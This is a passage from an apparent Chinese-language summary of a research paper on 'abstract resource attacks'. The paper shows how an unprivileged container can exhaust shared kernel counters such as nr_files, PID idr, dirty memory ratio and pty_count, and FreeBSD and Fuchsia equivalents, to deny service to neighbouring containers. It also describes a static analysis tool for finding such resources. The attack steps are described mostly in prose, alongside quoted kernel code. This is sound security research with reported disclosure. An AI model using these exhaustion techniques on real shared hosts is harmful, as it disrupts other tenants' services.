Azure、谷歌cloud和阿里云）上的共享内核容器环境中的这些选定资源进行攻击实验。试验结果表明，所有环境都容易受到我们的攻击。最后给出了多种降低抽象资源攻击风险的策略。 本文的贡献如下： New Attack Surface：我们揭示了操作系统级虚拟化所固有的新的攻击面。我们提出了一种新的攻击方法，称为抽象资源攻击。我们证明了抽象资源攻击是非常实用的，并且是影响Linux、FreeBSD和Fuchsia的广泛攻击类别。 Systematic Analysis：我们设计并实现了一个基于LLVM的静态分析工具来识别Linux内核中脆弱的抽象资源，包括基于配置的分析和容器可控性分析。我们的工具检测501个可以在Linux内核中动态重复触发的抽象资源。 Practical Evaluation：我们评估了AWS、MS Azure、谷歌Cloud和阿里云上self-deployed共享内核容器环境中的7种抽象资源攻击。（目前的公共云供应商没有直接向不同的用户提供共享内核容器。公共云中的容器通常由虚拟机隔离。）所有环境都容易收到抽象资源攻击。其中有两个环境易受6 attacks，一个环境易受 5 attacks，另一个环境易受 4 attacks。我们负责地向所有云供应商披露了我们的调查结果。所有这些都证实了所确定的问题。 Community Impact：我们计划在GitHub - ZJU-SEC&#x2F;AbstractResourceAttack: This repository is used to analysis the shared resources of different containers中开源我们的工具和识别出的抽象资源，这样它们就可以帮助Linux内核community和容器community识别出OS-level虚拟化中资源隔离的弱点。 BackgroundOS-level虚拟化依赖于底层操作系统内核进行资源隔离和containment。更具体地说，Linux内核为资源隔离提供了namespace，为资源containment提供了cgroup。 Linux NamespacesLinux namespace提供进程级资源隔离。目前，Linux namespace分为8种类型。根据它们的发布时间，如下： Mount：用于文件系统隔离 UTS：用于主机名和域名隔离 IPC：用于消息队列隔离 PID：用于进程ID隔离 Network：用于网络资源隔离 User：用于UID&#x2F;GID隔离 Cgroup：用于cgroup隔离 Time：用于时钟时间隔离 一个进程可以被分配给不同类型的不同namespace。但是对于每种类型，它只能属于一个namespace。默认情况下，进程与其父进程在相同的namespace中。它可以在进程创建期间通过pass specific flags添加到新的namespace，或者在进程运行期间通过调用setns系统调用添加到新的namespace。理想情况下，只有同一namespace中的进程可以共享namespace隔离的资源。因此，资源是跨namespace隔离的。因此，一个namespace中的隔离资源耗尽不会影响其他namespace中的进程。这样的设计本质上要求namespace机制正确且彻底地contain资源。 然而，仍然有数百种抽象资源类型没有包含在namespace中。即使有namespace的保护，大型攻击面仍然存在。有人可能会主张使用namespace隔离所有抽象资源。然而，这是不切实际的:抽象资源的巨大数量和灵活性使得解决方案由于巨大的代码更改和高性能开销而无法接受。 Linux Control Groups另一方面，Linux cgroup用于限制限制资源的实用。cgroup负责控制组内所有进程使用的资源。cgroup被组织成树状结构，其中children的资源也包括parent的资源。对资源使用的限制也在树上递归地强制执行，以便cgroup中的资源使用不应超过其所有祖先的限制。 cgroup主要管理硬件资源，如CPU、内存、存储、IO等。有两个版本的cgroup，v1和v2，主要的区别是，cgroup v1对于每种类型的资源可以有一个树状层次结构，而控制组v2只有一个层次结构。resource account和resource usage limit的实现在v1和v2之间差别不大。目前默认使用cgroup v1，因为它更稳定，并提供更多对资源的控制。它管理13种资源类型，而v2目前只支持9种资源类型。更具体地说，在这13种资源中，有5种用于CPU accouting，包括cpu、cpuacct、cpuset、freeze、pref_event；其中3个是用于内存，包括memory、hugetlb、rdma；blkio用于storage；还有3个用于IO，包括devices、net_cls、net_prio。只有PIDs cgroup为PID的抽象资源。 虽然限制容器进程中共享抽象资源的使用可以减轻DoS攻击，但将cgroup扩展到包括所有抽象资源也是不切实际的。计算资源并对如此多类型的资源实施限制将引入不可接受的开销。 Abstract Resource Attacks Threat model and assumptions：在本文中，由于我们的目标是OS-level虚拟化，所以我们假设容器运行在相同的共享内核上。容器执行最先进的保护，并在部署中遵循最安全的实践。更具体地说，容器以不同的非根用户运行，删除了所有功能。而内核则为容器强制使用尽可能多的namespace和cgroup。此外，内核还使用seccomp来阻止敏感的系统调用。我们进一步假设内核没有bug，所有安全机制都正常工作。 另一方面，攻击者控制一个容器，并试图破坏在同一内核上运行的其他容器。攻击者可以在容器内运行任何代码并调用seccomp允许的系统调用。但是，他&#x2F;她不允许利用内核漏洞。此外，攻击者作为非根用户处于非特权容器中，根本没有任何功能。最后，攻击者不允许升级特权或重新获得任何功能。在下面的文章中，我们展示了由于内核中的共享抽象资源，即使这样的攻击者仍然可以对其他容器发起DoS攻击。 Weaknesses in OS-level Virtualization在OS-level虚拟化中，容器直接或间接地共享成千上万的内核抽象资源，这使它们容易受到资源耗尽攻击。我们利用Linux内核中的一个示例来说明细节。 12345678910111213141516171819202122232425static struct percpu_counter nr_files __cacheline_aligner_in_smp;static long get_nr_files(void)&#123; return percpu_counter_read_positive(&amp;nr_files);&#125;struct file *alloc_empty_file(int flags, const struct cred *cred)&#123; static long old_max; struct file *f; if(get_nr_files() &gt;= files_stat.max_files&amp;&amp;!capable(CAP_SYS_ADMIN) &#123; ... goto over; &#125; f = __alloc_file(flags, cred); if (!IS_ERR(f)) percpu_counter_inc(&amp;nr_files); ...over: ... return ERR_PTR(-ENFILE);&#125; 它定义了一个每个CPU计数器nr_files，一个函数get_nr_files()和一个函数alloc_empty_file()。 nr_files：这是一个每个CPU计数器，用于跟踪每个CPU上分配的文件结构的数量。 get_nr_files()：此函数通过读取nr_files计数器的正值，返回所有CPU上分配的文件结构的总数。 alloc_empty_file()：此函数接受两个参数，flags和cred，并尝试分配一个空的文件结构。 如果分配的文件结构的数量（get_nr_files()）大于或等于允许的最大值（files_stat.max_files），并且当前进程没有CAP_SYS_ADMIN能力，它将跳过文件分配并跳转到over标签。 如果满足条件，它将调用__alloc_file()函数来分配一个新的文件结构。 如果分配成功（即返回的指针不是错误），它会增加nr_files计数器。 如果分配失败或达到最大文件数且没有所需的权限，该函数将返回一个带有-ENFILE错误代码的错误指针。 代码显示了Linux内核中的全局变量nr_files和函数alloc_empty_file。alloc_empty_file分配struct文件(f = __alloc_file(flags, cred);)。对于每个分配的结构文件，nr_files通过增加计数器来计算(ercpu_counter_inc(&amp;nr_files);)。在主机Linux内核中，struct文件的总数受files_stat的限制。Max_files(if(get_nr_files() &gt;= files_stat.max_files&amp;&amp;!capable(CAP_SYS_ADMIN))。如果达到限制，alloc_empty_file返回一个错误(return ERR_PTR(-ENFILE);)。 然而，Linux内核并没有提供任何namespace或cgroup来隔离或限制nr_files。因此，nr_files是可以直接控制所有容器的–任何容器对结构文件的分配都会增加相同的共享全局变量nr_files。 这样的nr_files共享会导致新的攻击。在Linux中，所有东西都是一个文件。如此多的操作，如文件打开、进程创建、管道创建、新的网络连接创建，甚至计时器创建(timerfd_create)和事件生成(eventfd)，都增加了nr_files。恶意容器可以很容易地将nr_files弹出到其上限。实际上，在我们的实验中，nr_files的配额可以在几秒钟内快速耗尽。因此，所有使用struct文件的操作都将失败。 影响是严重的:受害者容器甚至不能运行命令(因为它需要打开命令文件)或执行新的二进制文件，导致程序崩溃。从上面的例子中，我们发现即使容器有足够的物理资源，比如CPU或内存，如果没有nr_files中的配额，它仍然不能运行任何新的程序。 为了证明抽象资源攻击会影响所有内核功能，我们针对Linux内核功能的每个方面(包括进程、内存、存储和IO管理)提出了一个抽象资源攻击。在本节中，我们将展示本地测试环境上的攻击结果.。 对于本地测试环境设置，测试机器具有Intel Core i5 CPU, 8 GB内存和500 GB HDD，运行Ubuntu 18.04和Linux内核v5.3.1。我们将其称为主机。在主机上，我们使用docker 18.06.0-ce建立了两个docker容器，分别作为攻击者容器和受害者容器使用。我们按照docker安全最佳实践设置了这两个容器，即在不同的非根用户中运行它们，删除所有功能，启用namespace和cgroup，并应用seccomp系统调用阻塞，如threat model中所讨论的那样。 Attacks on Process Management为了实现进程管理，Linux内核引入了一系列的抽象资源，如进程控制块struct task_struct、pid、state和各种数据结构来支持派生实体,如用于线程的struct thread_info、struct rq runqueues用于调度,struct shm_info和struct semaphore用于进程间通信（IPC），struct spinlock和struct semaphores来实现同步。事实上，Linux中的进程管理引入了成千上万的抽象资源。在下面，我们介绍针对结构idr的攻击，作为一个的例子。 Attacking idr of PIDLinux内核引入了用于整数ID管理的struct idr。进程管理也使用idr进行pid分配。代码显示了alloc_pid函数，该函数调用idr_alloc_cyclic来获得一个新的pid。Idr_alloc_cyclic在idr分配期间检查pid_max，如果idr增长超过pid_max，则返回一个负错误代码。稍后我们将展示，即使启用了PID namespace和PID cgroup，idr仍然可以被视为所有进程的全局共享资源。类似于fork炸弹，恶意容器进程可以重复fork耗尽所有idr。因此，共享内核上的所有容器都不能创建任何新的进程或线程。 在我们的实验中，攻击者-容器通过调用fork系统调用反复生成进程。结果，在受害容器中，所有与创建新进程相关的操作都失败，并报错“资源临时不可用”。即使是主机上的根用户也会遇到同样的故障。 12345678910111213struct pid *alloc_pid(struct pid_namespace *ns,pid_t *set_tid, size_t set_tid_size)&#123; ... nr = idr_alloc_cyclic(&amp;tmp-&gt;idr, NULL, pid_min, pid_max, GFP_ATOMIC); ... if(nr &lt; 0) &#123; retval = (nr == ENOSPC) ? -EAGAIN : nr; goto out_free; &#125; pid-&gt;numbers[i].nr = nr; ...&#125; 这段C代码片段是Linux内核中的一部分，涉及到进程ID（PID）的分配。它定义了一个名为alloc_pid的函数，用于在给定的namespace ns中分配一个新的PID。 alloc_pid函数接受以下参数： struct pid_namespace *ns：进程ID的命名空间，用于将PID限制在特定的namespace范围内。 pid_t *set_tid：指向一个包含线程ID的数组，这些线程ID与新分配的PID关联。通常用于clone系统调用。 size_t set_tid_size：set_tid数组的大小。 在函数的主体中： idr_alloc_cyclic()函数被调用以在tmp-&gt;idr中分配一个新的ID，范围在pid_min和pid_max之间。GFP_ATOMIC标志表示内存分配应该是原子性的，即在不释放内核锁的情况下进行分配。 如果nr小于0，说明分配失败。根据失败的原因，retval被设置为-EAGAIN（当nr等于ENOSPC）或nr。然后跳转到out_free标签。 如果分配成功，pid-&gt;numbers[i].nr被设置为新分配的ID。 这段代码负责在给定namespace中分配和管理进程ID。 The effectiveness of the PID namespaceLinux v2.6.24引入了PID namespace，它为进程提供了一组独立的PID，这些PID来自其他PID namespace。但是，在PID namespace实现中，Linux内核会在根PID namespace中为其他PID namespace中分配的任何PID分配一个额外的PID，这样其他PID namespace中的所有PID都可以映射到根PID namespace。换句话说，根PID namespace仍然是全局共享的。因此，即使攻击者-容器处于分离的PID namespace中，其PID分配仍然会耗尽根PID namespace中的PID，从而导致victim-container和主机上的new-process-create失败。因此，即使启用了PID namespace，容器仍然容易受到上述idr耗尽攻击的攻击。 The effectiveness of the PIDs control group最近在Linux v4.3中也引入了PIDs cgroup。它的作用是用来限制分配在一个控制组中的PIDs的总数。更具体地说，PIDs控制组在进程分叉过程中检查进程的限制，如果PIDs控制组中的总进程数（pids_cgroup-&gt;counter）达到上限（pids_cgroup -&gt;limit），则返回错误并中止分叉。PIDs控制组在防御直接分叉方面是有效的。然而，它只向当前进程收取pid号。attacker-container可以欺骗内核来分叉大量的内核线程，比如频繁中止导致内核产生中断处理线程。通过这种方式，idr被内核线程耗尽，这就绕过了由 PIDs cgroup。 Attacks on Memory ManagementLinux内核引入了各种内核数据结构，例如mm_struct用于保存进程的所有内存相关信息，vm_area_struct用于表示虚拟内存区域。此外，为了提高读写效率，Linux内核还使用内存作为缓冲区来缓存某些数据。此外，还介绍了回写方案，即只对内存进行写操作。脏内存页稍后将由内核线程写入磁盘。使用write-back方案，调用方只需要写入内存，而不需要等待耗时的磁盘io操作完成(即wirtr-through)，这大大提高了写性能。然而，我们发现内核并没有隔离或限制脏内存区域的使用，这给了攻击者耗尽所有脏内存的机会，这大大减慢了其他容器的速度。接下来，我们讨论对脏内存的攻击。 Attacking dirty_throttle_control memory dirty ratioLinux内核为脏区控制引入了dirty_throttle_control结构体，它使用dirty字段表示整个内核空间的dirty ratio。只要dirty值太高，内核就会唤醒后台线程，将脏内存同步到磁盘。但同时由于dirty比过高，内核会阻塞write_back，将所有写都转换为write_through，写性能大大降低。 不幸的是，内核没有为内存dirty ratio提供任何隔离。任何进程都可能影响全局内存dirty ratio。在我们的攻击中，攻击者-容器使用dd命令生成文件，快速占用所有脏内存，达到内存dirty ratio限制。结果，来自主机或受害者容器的所有写操作都被转换为write_through，这极大地降低了性能。在我们的实验中，由于攻击，受害者容器上的命令dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;&#x2F;mnt&#x2F;test bs&#x3D;1M count&#x3D;1024的性能从1.2 GB&#x2F;s下降到32.6 MB&#x2F;s，导致97.3%的减速。 此外，即使是主机上的特权根用户也有96.1%的性能下降。 请注意，当前Linux内核没有与内存管理相关的namespace，内存cgroup用于限制内存使用，而不是限制内存dirty ratio。因此，无法防御针对内存dirty ratio的攻击。 Attacks on Storage Management操作系统内核将磁盘或其他辅助存储抽象为文件，并引入各种与文件相关的抽象资源。实际上，Linux内核中的存储管理是复杂的，它涉及数千个函数和数据结构。在我们的实验中，我们发现有133个与存储相关的抽象资源可以从容器进程中访问。不幸的是，内核没有提供任何namespace或cgroup来隔离或限制这些抽象资源的使用。因此，攻击者容器可以耗尽这些抽象资源，对共享内核上的其他容器发起DoS攻击。 接下来，我们将说明恶意容器如何利用文件限制变量nr_files进行DoS攻击。 Attacking nr_filesnr_files是Linux内核中的一个全局变量，它计算内核中打开的文件总数。更具体地说，对于每个分配的结构文件，内核将nr_files加1。不幸的是，nr_files是所有进程共享的。它既不受namespace的隔离，也不受任何cgroup的限制。因此，攻击容器可以很容易地耗尽nr_files来实现DoS攻击。 为了验证这种攻击的可行性，我们的攻击容器生成了数百个进程，每个进程打开1024个文件。因此，nr_files达到其极限。结果，在主机和受害者容器上，所有文件打开操作都失败，内核发出“系统中打开的文件太多”的警告。我们的攻击证实，即使只有几百个进程，攻击者也能够耗尽nr_files。而为了可用性，pid cgroup通常允许数千个进程。因此，即使启用了pid cgroup，攻击者-容器仍然可以成功地对nr_files进行dos攻击。更糟糕的是，nr_files在所有进程(包括根进程和非根进程)之间共享。 因此，不仅非特权容器进程受到影响，主机上的根进程也不能执行任何文件打开操作。 12345678910111213141516171819202122232425static struct percpu_counter nr_files __cacheline_aligner_in_smp;static long get_nr_files(void)&#123; return percpu_counter_read_positive(&amp;nr_files);&#125;struct file *alloc_empty_file(int flags, const struct cred *cred)&#123; static long old_max; struct file *f; if(get_nr_files() &gt;= files_stat.max_files&amp;&amp;!capable(CAP_SYS_ADMIN)) &#123; ... goto over; &#125; f = __alloc_file(flags, cred); if (!IS_ERR(f)) percpu_counter_inc(&amp;nr_files); ...over: ... return ERR_PTR(-ENFILE);&#125; Attacks on IO ManagementIO管理是操作系统的重要组成部分。为了便于管理，Linux内核将IO设备抽象到/dev文件中，并引入抽象资源(如tty_struct)来实现IO设备管理。与前面的情况类似，这些抽象资源不受任何namespace或控cgroup的隔离或限制，因此会导致新的攻击。下面，我们将介绍针对pty_count的攻击，它会导致SSH连接出现DoS。 Attacking pty_countLinux内核将伪终端pseudo-terminal(缩写为pty)抽象为/dev/ptmx和/dev/pts。与此同时，内核还使用一个名为pty_count的全局变量来计算打开的pseudo-terminal的总数，每打开一次/dev/ptmx，pseudo-terminal的总数就增加1，如代码。但是，内核没有提供任何namespace或cgroup来隔离或限制pty_count的使用。因此，攻击者可以很容易地耗尽pty_count。 123456789101112131415161718static atomic_t pty_count = ATOMIC_INIT(0);int devpts_new_index(struct pts_fs_info *fsi)&#123; int index = -ENOSPC; if (atomic_inc_return(&amp;pty_count) &gt;= (pty_limit - (fsi-&gt;mount_ops.reserve ? 0 : pty_reserve))) goto out; return index;&#125;static int ptmx_open(struct inode *inode, struct file *flip)&#123; ... index = devpts_new_index(fsi); ...&#125; 这段C代码片段是Linux内核中的一部分，涉及到伪终端（PTY）的分配和管理。它定义了一个名为devpts_new_index的函数，用于在给定的文件系统信息fsi中分配一个新的伪终端索引。此外，还展示了一个名为ptmx_open的函数，它在打开伪终端主设备（PTMX）时调用devpts_new_index。 一个名为pty_count的原子变量被初始化为0。它表示当前分配的伪终端的数量。 devpts_new_index函数接受一个参数： struct pts_fs_info *fsi：一个指向伪终端文件系统信息的指针。 在devpts_new_index函数中： 初始化index为-ENOSPC，表示没有足够的空间分配新的索引。 增加pty_count的值。如果增加后的值大于等于pty_limit - (fsi-&gt;mount_ops.reserve ? 0 : pty_reserve)，则跳转到out标签。 返回index。 ptmx_open函数是在打开伪终端主设备（PTMX）时调用的。它接受两个参数： struct inode *inode：表示伪终端主设备（PTMX）的inode结构。 struct file *flip：表示伪终端主设备（PTMX）的file结构。 在ptmx_open函数中，调用devpts_new_index(fsi)以获取一个新的伪终端索引。 这段代码负责在给定的伪终端文件系统信息中分配和管理伪终端索引。当打开伪终端主设备（PTMX）时，会调用devpts_new_index函数以获取新的伪终端索引。 在我们的实验中，攻击者不断打开/dev/ptmx在触发ptmx_open，它调用devpts_new_index并增加pty_count。在几秒钟内，pty_count达到极限，所有接下来的ptmx_open操作都会失败。其后果很严重，因为pty设备被各种应用广泛使用，如SSH连接。结果是，由于伪终端打开失败，所有对任何其他容器的SSH连接尝试都会失败。更糟糕的是，主机无法启动任何新的容器，因为新容器的连接由于同样的错误而被拒绝。 Attacking FreeBSD and Fuchsia Kernels抽象资源攻击的根本原因是共享的内核数据(即抽象资源)。接下来，我们将演示共享内核数据还使FreeBSD和Fuchsia容易受到抽象资源攻击。 Attacking FreeBSD 在FreeBSD内核中，在Linux内核中类似的资源之后，我们手动识别了5个共享的全局抽象资源，分别是dp_dirty_total、numvnodes、openfiles、pid和pty。我们的实验进一步证实了前两个可以被DoS攻击，而后三个则受到rctl per-jail的限制。 实验是在FreeBSD 13.0-RELEASE和Ezjail-admin v3.4.2上进行的，运行在具有Intel酷睿i5处理器、8GB内存和40GB硬盘的虚拟机上。Ezjail是一个jail管理框架。ezjail命令提供了一种使用FreeBSD的jail系统创建多个jail的简单方法。这里的jail类似于Linux上的容器。我们根据FreeBSD手册建立了两个jail，并使用rctl来限制每个jail的资源。我们使用这两个jails作为attacker-jail和victim-jail，这类似于§3.1中的容器设置。 对于脏计数器dp_dirty_total, FreeBSD中的ZFS引入了dsl_pool结构体来记录每个ZFS池的数据。dsl_pool结构体使用dp_dirty_total字段表示整个ZFS池脏数据。当dp_dirty_total达到zfs_dirty_data_max的限制时，ZFS将延迟即将进行的写操作，并等待脏数据同步到磁盘。不幸的是，FreeBSD没有为dp_dirty_total提供任何隔离。在attacker-jail中，我们运行命令dd if=/dev/zero of=/mnt/test bs=1M count=1024(与§3.3中的相同)来耗尽dp_dirty_total。因此，victim-jail的IO性能下降了46%。 对于numvnodes, FreeBSD使用vnode结构体来表示文件系统实体，例如文件或目录。FreeBSD还保留了一个全局变量numvnodes来记录整个内核中vnode的总数。极限在maxvnodes。在实验中，通过在attacker-victim中重复创建目录，我们可以很容易地耗尽主机的numvnodes并达到maxvnodes的限制。 Attacking Fushsia Fuchsia使用Zircon内核，他引入了handle的概念，允许用户空间程序引用内核对象。Zircon维护了一个名为gHandleTableArena的全局数据结构，用于分配所有句柄。内核中handle的限制是kMaxHandleCount。handle在Zircon中使用非常频繁。令人惊讶的是，我们发现handle的创建不受限制。我们在Fuchsia模拟器上进一步确认了这个问题。具有基本权限(类似于Linux中的功能)的用户可以重复创建handle，耗尽所有handle，从而导致整个系统崩溃。我们向Fuchsia开发人员报告了这个问题。他们已经确认了这个问题，并计划在确定更多的攻击载体到本地DoS后修复这个问题。 Summary从上面的讨论中，很容易看出抽象的资源攻击是非常实用的，后果是严重的。更糟糕的是，抽象资源在Linux内核中非常常见，影响Linux功能的各个方面。此外，抽象资源攻击是操作系统级虚拟化所固有的。它也适用于FreeBSD和Fuchsia内核。 Static Analysis Of Container-Exhaustible Abstract Resources如前所述，抽象资源对容器至关重要。 另一方面，有成千上万的抽象资源，这使得几乎不可能列举所有这些资源。在本文中，我们迈出了识别容器共享的可耗尽抽象资源的第一步。 Challenges 首先，很难识别有意义的抽象资源，尤其是那些在内核中共享的资源。Linux内核中的抽象资源可以是变量或数据结构实例。然而，并非所有变量或数据结构实例都是有意义的抽象资源。我们需要找到对操作系统功能至关重要的抽象资源。此外，所识别的抽象资源需要在容器之间共享，以便一个容器可以耗尽这些资源来攻击其他容器。不幸的是，没有关于可共享抽象资源的文档。 为了解决这个问题，我们建议使用基于配置的分析configuration-based analysis和基于访问的分析access-based analysis来识别Linux内核中的各种共享抽象资源。 其次，决定容器是否可以用尽特定的抽象资源是一个挑战。与普通的用户空间程序不同，从容器中访问资源面临更多的限制，如namespace、cgroup和seccomp。此外，由于每个容器在一个单独的用户中运行，其资源消耗也受到每个用户的限制。因此，对资源消耗点的简单可达性分析不能说明容器对抽象资源的可控性。例如、对于被namespace隔离的抽象资源，即使容器可以消费这些抽象资源，由于namespace的隔离，它仍然可能不会影响其他容器。因此，为了克服这一挑战，我们提出了容器可控性分析，包括seccomp限制分析、per-user限制分析和namespace隔离分析，以进一步过滤容器可耗费的资源。 图显示了我们的工具的体系结构，它自动识别出容器可耗尽的抽象资源。分析工具以内核源IR作为输入。它首先使用§4.1中基于配置的分析和基于访问的分析来识别所有内核可共享的抽象资源。然后进行§4.2中的系统调用可达性分析和容器限制分析，包括seccomp、per-user和namespace限制分析，分析这些抽象资源上的容器可控性。 此外，我们在§4.3给出了分析结果。 Identification of Kernel Shareable Abstract Resources如前所述，从成千上万的内核变量和数据结构实例中识别有意义的抽象资源具有挑战性。更困难的是，为了确保这些抽象资源在容器之间直接或间接地共享，我们需要将它们缩小到可共享的内核抽象资源。 为了克服这一挑战，我们利用内核编程范例并提出基于配置的分析和基于访问的分析来识别内核可共享资源。 Configuration-based AnalysisLinux内核在/proc/sys下提供sysctl接口，允许用户空间程序配置内核参数。我们的主要观察结果是，这些sysctl配置中的大多数用于抽象的资源限制，例如限制文件数fs.file-nr或内存大页vm.nr_hugepages。因此，所有容器都共享由sysctl配置指定的相同全局限制。这样的sysctl配置提供了关于容器之间可共享的抽象资源的重要线索。 基于上述观察，我们建议使用sysctl配置来识别可共享的内核抽象资源，称为基于配置的分析，它包括三个基本步骤。 首先，它使用特定的sysctl数据类型来识别所有的sysctl相关数据结构。这些数据结构包含可配置的sysctl内核参数。 其次，sysctl数据结构通常包含在/proc/sys/文件夹中显示sysctl值的函数。因此，通过分析该函数，我们能够准确地找出该内核参数的变量。 最后，如果一个内核参数被用于限制资源消耗，它的相应变量应该出现在比较指令中。因此，我们按照使用-定义链来检查所确定的变量的使用情况，如果它在比较指令中被使用，就把它标记为抽象资源。 我们在LLVM中设计并实现了一个过程间分析通道。我们在代码中使用一个示例来说明细节。具体来说，Linux内核使用类型struct ctl_table来配置sysctl内核参数，例如代码中的第1行所示的fs_table中的文件系统配置。 因此，该通道首先遍历所有的内核全局变量，收集所有的结构ctl_table变量，如代码中的fs_table。其次，fs_table使用proc_handler中的函数指针来显示/proc/sys/文件系统中的参数。因此，从遍历所有的内核全局变量来收集所有的结构ctl_table变量，如代码中的fs_table。 第二，fs_table使用proc_handler中的函数指针来显示/proc/sys/文件系统中的参数。因此，从proc_handler字段中，通证遵循其指向，启动程序间分析以获得确切的变量，其值显示在sysctl配置界面中。如代码第19行所示，我们的传递将nr_files标记为关键变量。 第三，我们的传递检查所有已识别的关键变量的使用情况。如果一个关键变量在比较指令中被使用（即LLVM IR中的icmp），我们的传递就会记录这些位置并将这个变量标记为抽象资源。例如，在代码的第25行，nr_files被用于比较。我们的传递进一步检测到，如果比较失败，在第25行和第27行会返回一个错误。因此，我们的传递将nr_files标记为一个抽象资源。通过分析所有的struct ctl_table，我们的传递得到一个抽象资源的集合。 12345678910111213141516171819202122232425262728293031static struct ctl_table fs_table[] = &#123; ... &#123; .procname = &quot;file-nr&quot;, .data = &amp;files_stat, .proc_handler =proc_nr_files, &#125;, ...&#125;int proc_nr_files(...)&#123; files_stat.nr_files = get_nr_files(); ...&#125;static long get_nr_files(void)&#123; return percpu_counter_read_positive(&amp;nr_files);&#125;struct file *alloc_empty_file(int flags, ...)&#123; ... if(get_nr_files() &gt;= files_stat.max_files &amp;&amp; !capable(CAP_SYS_ADMIN)) &#123; ... goto over; &#125; ...&#125; 这个代码片段是一个C代码，用于管理Linux内核模块中的文件资源。它定义了一个名为fs_table的ctl_table结构数组、一个用于设置当前打开文件数量的proc_nr_files函数、一个返回打开文件数量的get_nr_files函数，以及一个在打开文件数量未超过允许的最大值时分配新文件结构的alloc_empty_file函数。 以下是各个组件的详细解释： fs_table是一个ctl_table结构数组，用于定义/proc/sys/fs/目录中的sysctl条目。具有procname为”file-nr”的条目与当前打开文件的数量相关联。 proc_nr_files是一个设置当前打开文件数量的函数。当调用该函数时，它会使用get_nr_files()函数返回的值更新files_stat.nr_files。 get_nr_files是一个返回当前打开文件数量的函数。它通过从名为nr_files的percpu_counter结构中读取一个值来实现这一点。该结构用于以适用于多核系统的高效方式存储文件数量。 alloc_empty_file是一个尝试分配空文件结构的函数。它检查当前打开文件的数量（由get_nr_files()返回）是否大于或等于最大允许的文件数量（存储在files_stat.max_files中）。如果满足此条件且调用者没有CAP_SYS_ADMIN能力，则跳转到标签over，这个标签可能处理文件数量超过最大值的情况。 这个代码片段是Linux内核如何管理文件资源并对同时打开的文件数量施加限制的一个例子。 Access_based Analysis除了sysctl配置外，Linux内核还使用锁或原子机制来保护并发访问的资源。因此，我们建议使用并发访问作为标识来标识一组可共享的抽象资源。 由于（race condition）竞态条件和并发性分析是一个老话题，我们采用现有的lockset检测方法。如果锁在数据结构的某个字段上，我们将该数据结构标记为抽象资源，并将该函数添加到敏感函数集中。具体来说，如果在某个数据结构的字段上使用了锁，那么可以将此数据结构标记为抽象资源，并将涉及该字段的函数添加到敏感函数集合中。这意味着这些函数可能需要特别关注，因为它们可能会受到并发访问的影响。此外，如果一个变量在lock和unlock函数之间被定量地修改，我们也将其标记为抽象资源。例如，多个线程在没有锁保护的情况下访问同一数据结构，那么可以将这组资源标记为抽象资源。如果某个变量在 lock 和 unlock 函数之间被定量地修改（即，在锁保护下发生了修改），那么也可以将其标记为抽象资源。这有助于进一步确定可能受到并发影响的资源。 除了锁定&#x2F;解锁，我们还观察到原子计数器和percpu计数器还用于保护并发访问的数据，例如percpu_counter_inc和atomic_inc_return。因此，我们实现了一个pass来分析所有原子计数器和percpu计数器的使用情况。我们的传递首先分析函数参数，并将所有具有struct atomic_t、struct atomic64_t和struct percpu_counter参数的函数添加到原子/percpu函数集中。其次，遍历所有内核函数中的所有语句，以检查原子/percpu函数的所有使用情况。如果一个变量被传递给一个原子/percpu函数，我们将它标记为一个抽象资源。 识别具有原子/percpu计数器参数的函数. 遍历内核函数中的语句，检查原子/percpu函数的使用情况。 在实现过程中，我们发现LLVM链接器合并了具有相同内存布局的结构类型，例如typedef struct &#123;int counter;&#125; atomic_t和typedef struct &#123;uid_t val;&#125; kuid_t。原因是uid_t的类型是unsigned int，它的大小与int相同。因此，LLVM链接器将它们合并，并错误地使用kuid_t代替atomic_t。为了解决这个问题，我们跟踪LLVM链接器，并发现lib/ linker / irmove .cpp中的get方法将新类型与现有类型进行比较，如果内存布局相同，则合并它们。因此，我们通过注释掉比较和合并代码来禁用合并。 Container-Contorllability Analysis通过识别抽象资源，我们提出了容器可控性分析，以确保容器实际上可以消耗这些抽象资源。我们对容器可控性分析的想法是（two-fold）双重的。 首先，我们需要确保容器进程可以到达§4.1中的抽象资源消耗点。为此，我们基于内核控制流图执行传统的反向控制流分析，其中基于结构类型解析间接调用。如果没有从系统调用项到抽象资源消耗点的路径，我们将该抽象资源标记为容器不可访问的。 其次，注意，单靠可达性分析是不够的，我们需要进一步确保路径上没有额外的特定于容器的限制。换句话说，我们需要检查路径上是否存在任何限制检查，以确保容器可以耗尽这些抽象资源。如前所述，与用户空间程序不同，容器面临更多限制，如seccomp、namespace、cgroup以及每个用户的资源限制。由于我们的可达性分析是标准的，在接下来的文章中，我们将重点关注限制分析。 Seccomp Restriction AnalysisSeccomp是一种用于系统调用过滤的机制。我们对seccomp的限制分析如下。在我们的实现中，我们使用Docker默认的seccomp配置文件，它可以阻止超过50个系统调用。在从系统调用条目到资源消耗站点的所有路径中，我们过滤掉来自任何阻塞的系统调用的路径。 Per-User Restriction Analysis在实际部署中，容器通常以不同的用户运行。因此，每个容器的资源消耗也受到peruser资源配额的限制。例如，Linux提供了user-limits命令ulimit，用于限制用户的资源消耗。而ulimit的底层实现是使用rlimit来设置多个每个用户的资源配额。 除了ulimit, Linux还提供了允许用户利用PAM (Pluggable Authentication Module)部署每个用户配额的接口。PAM使用setup_limits函数来设置每个用户的资源配额，该函数调用setrlimit来配置多个rlimit约束。对于ulimit、rlimit和PAM所限制的资源，攻击者容器不能消耗超过每个用户配额的资源。因此，它无法完全控制这些抽象资源来发起DoS攻击。由于ulimit和PAM都使用rlimit来设置每个用户的资源配额，因此我们需要分析rlimit并过滤出受其限制的抽象资源。 对于rlimit分析，我们的关键观察是rlimit值通常在struct rlimit或struct rlimit64中指定。因此，我们首先遍历内核IR，以识别从struct rlimit或struct rlimit64加载的所有变量。然后，我们执行数据流分析，以跟踪这些变量的所有传播和使用，并在任何比较指令中使用这些函数时标记它们。在这些函数中，检查rlimit以限制某些资源。我们认为这些资源是攻击容器不可耗尽的，因此我们根据这些函数来过滤路径。我们的工具确定了40个检查rlimit的函数。 Namespace Isolation Analysis如前所述，Linux内核为资源隔离引入了namespace。对于namespace隔离的资源，Linux内核在每个namespace下为其创建一个“copy”，以便一个namespace中的修改不会影响其他namespace。因此，为了确认容器的可控性，我们需要确保那些抽象资源不受namespace的保护。这里的挑战是，尽管Linux有关于namespace的文档，但没有关于哪些抽象资源由namespace隔离的规范。 因此，我们提出了namespace隔离分析来系统地识别受namespace保护的抽象资源。 